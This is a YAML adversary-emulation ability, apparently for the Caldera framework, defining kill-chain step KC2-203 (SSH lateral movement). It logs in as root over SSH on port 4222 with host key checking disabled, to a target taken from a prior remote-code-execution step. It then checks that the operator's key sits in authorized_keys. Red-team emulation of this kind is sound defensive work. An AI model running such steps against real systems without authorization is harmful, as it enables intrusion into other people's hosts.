- id: 20000000-0000-0000-0000-000000000203
  name: KC2-203 - SSH Connection
  description: Shell SSH connection.
  tactic: lateral-movement
  technique:
    attack_id: T1021.004
    name: 'Remote Services: SSH'
  repeatable: false
  singleton: true
  platforms:
    linux:
      sh:
        command: |
          ENTRY='#{host.kc2.entry}';
          PREV='#{kc2.202.done}';
          mkdir -p "$DATA_PATH/KC2";
          TARGET_FILE="$DATA_PATH/KC2/attackaddr";
          {
            test -s "$TARGET_FILE" || {
              echo "Missing KC2 attack address: $TARGET_FILE. Run step 202 and inspect $DATA_PATH/KC2/rce-attack.log.";
              exit 1;
            };
            TARGET="$(cat "$TARGET_FILE")";
            PUBKEY_FILE="${KEY_PATH:-$HOME/.ssh/id_ed25519}.pub";
            test -s "$PUBKEY_FILE";
            ssh -p 4222 -o StrictHostKeyChecking=no root@"$TARGET" "grep -F -f - ~/.ssh/authorized_keys" < "$PUBKEY_FILE";
          } > "$DATA_PATH/KC2/ssh-authorized-keys.log" 2>&1 && echo kc2-203-done
        timeout: 900
        parsers:
          plugins.stockpile.app.parsers.basic:
          - source: kc2.203.done
        cleanup: ''
  requirements:
  - plugins.stockpile.app.requirements.paw_provenance:
    - source: host.kc2.entry
